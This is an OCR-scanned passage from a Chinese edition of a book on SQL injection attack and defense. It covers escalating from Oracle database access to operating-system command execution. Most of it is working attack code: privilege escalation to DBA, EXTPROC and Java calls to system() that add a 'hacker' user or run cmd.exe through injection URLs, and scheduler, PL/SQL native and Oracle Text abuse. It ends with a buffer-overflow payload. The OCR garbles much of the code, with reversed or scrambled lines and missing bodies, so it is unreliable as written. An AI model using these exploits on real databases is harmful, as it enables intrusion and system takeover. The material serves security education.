## Page 276
SQL注入攻击与防御（第2版）
如图6-26所示，查看user_role_privs表可确认用户SCOTT具有DBA角色
）talect+fren nier_role.r
IE2.30LE
YEGM
图6-26SCOTT 已被授予 DBA角色
与之类似，还可以利用其他一些公开的漏洞来实施权限提升攻击。除了遗漏安全补丁造成
的漏洞之外，将过多的权限或不安全的权限授予Oracle用户也是常见的情形。这也会导致权限
提升攻击，甚至在某些情况下可能会导致数据库用户可以获得DBA角色。
例如，考虑一个具有 CREATE ANY PROCEDURE和 EXECUTE ANY PROCEDURE 权限
的用户。这种访问权限允许数据库用户在其他用户的模式（schema）下创建存储过程。因此，数
据库用户可以在SYSTEM模式下创建一个存储过程：
CREATE OR REPLACE procedure SYSTEM.DBATEST
IS
BEGIN
END;
上面的代码创建了一个恶意存储过程，当执行该存储过程时，它将在SYSTEM用户许可
权限下执行一因此允许用户在SYSTEM许可权限下执行任意SQL语句。请注意，这个恶意
存储过程是在 SYSTEM模式下创建的，除非用户在具有 CREATEANY PROCEDURE权限之
外，还具有EXECUTEANYPROCEDURE权限，否则用户将无法直接执行该存储过程：
EXEC SYSTEM.DBATEST () ;
2）通过直接访问执行代码
如果可以直接访问Oracle 实例，那么根据Oracle版本的不同，可以使用下列多种不同的
方法。Oracle EXTPROC、Java和DBMS_SCHEDULER是Oracle 运行操作系统命令的正式方
法。除了这些方法之外，还可以使用Oracle数据库中的其他功能来执行操作系统代码，包括
PL/SQL native、Oracle Text、Alter System set 事f件、PL/SQL native 9/、Buffer overflow(级>中[区
溢出)+shell 代码以及Custom code(自定义代码)。
对于EXTPROC和Java来说，可使用下列工具自动实现该操作：
wwv, Oxdeadbeef .info/exploits/raptoz_oraexec.sq1
262
---
## Page 277
第6章利用操作系统
EXTPROC
Oracle数据库的PL/SQL程序设计语言可以通过EXTPROC执行外部过程，在Oracle数据
库主机上，可以滥用这一功能来执行操作系统命令。下面是所需的步骤：
(1）恶意用户首先创建一个共享对象（sharedobject)通常是DLL文件或系统库，其中包
含了允许执行OS代码的功能：
--对于Windovs系统
CREATE OR REPLACE LIBRARY exec_she11 AS *C:\vindows\system32\msvcrt.d11*;
-对于UNIX系统
CREATE OR REPLACE LIBRARY exec_she11 AS */1ib/1ibc-2.2.5.so′ ;
(2）创建一个过程，调用该库的系统函数：
CREATE OR REPLACE procedure oraexec (cmdstring IN CHAR) is external
NAME *system*
library exec_shel1
LANGUAGE C/
(3）执行该过程：
exec oraexec(*net user hacker hack3r /ADD'),
当执行oraexcc过程时，数据库指示EXTPROC加载msvcrt.dll或libe库，并执行systemO
函数。
在最新版本的Oracle中，已经不再允许加载和注册放在系统目录之中的外部库，比如c:
windowslsystem32或/lib目录。在最薪版本的Oracle中，要想使上面的攻击奏效，必须将DLL
或库文件复制到SORACLE_HOME/bin目录。可以使用6.2.2节“写文件”中介绍的UTL_FILE
包来实现复制。
通过Java库执行操作系统命令
可以通过执行下面的查询，查看用户Java(文件和执行）的许可权限：
select * from user_Java_policy where grantee_name =*ScorT*;
如果数据库用户具有正确的JavaIO许可权限，就可以使用下面两个函数来执行操作系统
代码。这两个函数调用了一个Oracle自带的Java库，其中已经定义好了执行OS代码的方法。
·DBMS_JAVA.RUNJAVA(受影响的系统：11gR1、11gR2)：
http://192.168.2.10/ora8.php7name=SCOTT* and (SELECT DBMS_JAVA
RUNJAVA (*oracle/aurora/uti1/Wrapper c1 \1windows\Lsystem32\\cmd. exe
/c dir>C:\\OUT,LST′) FROM DUAL) is not nu11 -
●DBMS_JAVA_TEST.FUNCALL(受影响的系统：9i R2、10g R2、11g R1、11g R2):
nttp://192.168.2.10/ora8.php?name=SCOTT* and (Se1ect DBMS_JAVA_TEST,
FUNCALL(*oracle/aurora/uti1/Wrapper*, *main*, *c:\\windows\\system32\1
在用户没有所要求的Java权限的情况下，数据库有可能易受某种攻击，在2010年黑相大
263
---
## Page 278
SQL注入攻击与防御（第2版）
会上，DavidLitchfield演示了DBMS_JVM_EXP_PERMS攻击问题。该漏洞（已经被Oracle2010
年4月的CPU修正)允许具有CREATESESSION权限的用户授予自己JavaIO许可权限：
DECLARE POL DBMS_JVM_EXP_PERMS .TEMP_JAVA_POLICY; CURSOR C1 IS SELECT
'*GRANT**, user (), **SYs'*, **java. io.FilePermission'*, **>'*,*′exeCute*', **ENABLED** FROM DUAL; BEGIN OPEN C1; FETCH
C1 BULK COLLECT INTO POL; CLOSEC1 ;DBMS_JVM_EXP_PERMS . IMPORT_JVM
PERMS (POL) ;END;
DBMS_SCHEDULER
DBMS_SCHEDULER是Oracle10g及之后版本中新增的内容，它要求拥有CREATE JOB
(10g R1)或 CREATE EXTERNAL JOB(10g R2/11g)权限。自10.2.0.2起，不能再以oracle 用户身
份执行操作系统命令，而要以nobody用户执行：
--Create a Program for dbms_scheduler
exec DBMS_SCHEDULER.create_PrOgram (′RDS2009′, *EXECUTABLE′, 'c:\WINDOWS\
system32\cmd.exe /c echo 0ned >> c:\rds3,txt′, 0, TRUE) ;
--Create, execute, and delete a Job for dbms_scheduler
exec DBMS_SCHEDULER.create_Job (job_name =>*RDS2009JOB',program_name
=>*RDS2009′,start_date => NULL, repeat_interval > NULL, end_date =>
NULL, enabled => TRUE, auto_drop => TRUE) :
PL/SQL native
Oracle 10g/1lg 中的PL/SQLnative 没有公开。根据我的经验，这是在Oracle 10g/1lg 中运
行操作系统命令最可靠的方法，因为命令是以Oracle 用户身份执行的。与Java 和 EXTPROC
变种所要求的条件不同的是：PL/SQLnative没有特别的要求，唯一要求是拥有修改数据库服务
器上SPNC_COMMANDS文本文件的权限。如果创建了存储过程、函数或包并启用了PL/SQL
native，那么Oracle 会执行该文件中的所有内容。
下列代码使用PL/SQLnative为public授予DBA权限。grant命令是一条通常以 SYS用户
身份执行的 INSERT INTO SYSAUTHS命令。本例中，我们创建了一个名为e2.sql且由 sqlplus
执行的文本文件，sqlplus 命令可通过PL/SQLnative 来启动：
CREATE OR REPLACE FUNCTION F1 return number
authid current_user as
pragma autonomous_transactionj
v_fi1e UTL_FILE.FILE_TYPE;
BEGIN
begin
-= grant dba to public;
DBMS_ADVISOR.CREATE_FILE (*insert into sys.sysauth$ values (1, 4, 0, nu11) :
*↑1chr (13) 1Ichz (10) 11* exitz *, *rx*, *e2.sq1*) ;
f,ix& AzoqooxTp doxp:,b 3avI03I 30o3x3
end;
EXECUTE IMMEDIATE q′1create directory T as *C:\ORACLE\ORA101\PLSQL′!′;
ut1_file, fremove (*T*, *spnc_commands*) 
v_file:= ut1_file. fopen (*T', *spnc_commands*, *w*) ;
ut1_file,put_line (v_file, *sqlplus / as sysdba @c:\e2.sql*) ;
utl_file,fclose (v_file) ;
264
---
## Page 279
第6章利用操作系统
EXECUTE IMMEDIATE q′1drop directory T1*;
EXEcUTE IMMEDIATE q'!alter Session set plsql_compiler_flags='NATIVE'!*;
EXECUTE IMMEDIATE q'!alter system set plsql_native_library_dir=*C:\'!′;
EXECUTE IMMEDIATE q'lcreate or replace procedure h1 as begin null;
end; !' ;
COMKIT;
RETURN 1;
END;
/
Oracle Text
Oracle Text 也可以执行操作系统命令。通过用户自定义的过滤器(USER_FILTER_PREF)，
可以将表的内容传递给用户自定义的过滤器。在下面的例子中，通过一个表将TCL代码传递
给用户自定义的过滤器。
使用Oracle Text用户自定义的过滤器存在着一个限制。只能从ORACLE_HOME/bin目录
执行。例如，oratclsh.exe就可以执行。对于这一限制，可以使用UTL_FILE包将相应的可执行
文件复制到ORACLE_HOME/bin目录，以便执行该文件：
create table t (id number (9) primary key, text varchar2 (2000))=
ctxsys , ctx_ddl . drop_preference (*USER_FILTER_PREF*);
Begin
end;
/
ctxsys ,ctx_ddl .create_preference
begin
preference_name -> *UsER_FILTER_PREF′,
object_name => 'USER_FILTER'
} 7
ctxsys.ctx_ddl.set_attribute
(*USER_FILTER_PREF′, *COMMAND′, *oratclsh.exe′) ;
end;
/
begin
insert into t values (1, '
-ipeqoegoxd xou sT wesAg xnox。 Js sqnd
close $f
set f [open [lindex Sargv 0](RDWR CREAT)]
close $f
');
end;
/
drop index user_filter_idx;
create index user_filter_idx on t (text)
indextype ia ctxsys, context
parameters (*FILTER USER_FILTER_PREF′) ;
select token_text from DRSUSER_FILTER_IDXSI;
265
---
## Page 280
SQL注入攻击与防御（第2版）
Alter System set 事件
Alter System set是一种非公开参数（自Oracle10g以米），它可以指定自定义调试器的名称。
在调试事件（debuggingevent)过程中将执行自定义的调试器，而调试事件则需予以强制实现。
例如：
PL/SQL native 9i
自9iR2以来，Oracle 提供了将PL/SQL代码转换成C代码的方法。为提高灵活性，Oracle
可以修改make工具的名称（例如，修改成calc.exe或其他可执行文件)。例如：
alter system set plsql_native_make_utility=*cmd.exe /c echo Owned > c:\
,+ 4x*spx
alter session set plsql_compiler_flags=*NArIVE';
Create or replace procedure rds as begin null; end; /
缓冲区溢出
2004 年, Cesar Cemudo 公布了关于 Oracle 中 NUMTOYMINTERVA 和 NUMTODSINTERVAL
这两个函数的—种缓冲区溢出漏洞(请参见http://seclists.org/vulnwatch/2004/q1/0030.html)。可以
使用下列漏润在数据库服务器上运行操作系统命令：
SELECT NUMTOYMINTERVAL (1, *AAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDEFGHIJKLMN
OPQR* 11chr (59) 11chz (79) 11chr (150) 11chx (01) 11chz (141) 11chx (68) I1chx
(148) 1Ichx (01) 1I chx (255) 11 chx (37) 11chr (172) 11chz (33) 11chz (148) 11 chz
(36) 11chz (18) 11 chr (80) 11chx (255) 11chr (21) 11chx (52) 11chr (35) 11chx
(01)11chr (32) 11*echo ARE YOU SURE? >c:\Unbreakable.txt′) FROM DUAL;
自定义应用代码
在Oracle领域，我们经常使用包含操作系统命令的表，这些命令由连接到数据库的外部程
序执行。使用指定的命令更新数据库中这样的条目时，我们经常可以控制系统。检查所有表以
寻找包含操作系统命令的列，这是永远值得一做的事情。例如：
I  Id I  Command
1 Description
1xodo. e ung 1 rbs*xodexe eqps oradebug setmypid
SQL> oradebug call system */bin/touch -f /home/oracle/rds.txt*Function
returned 0
4. PostgreSQL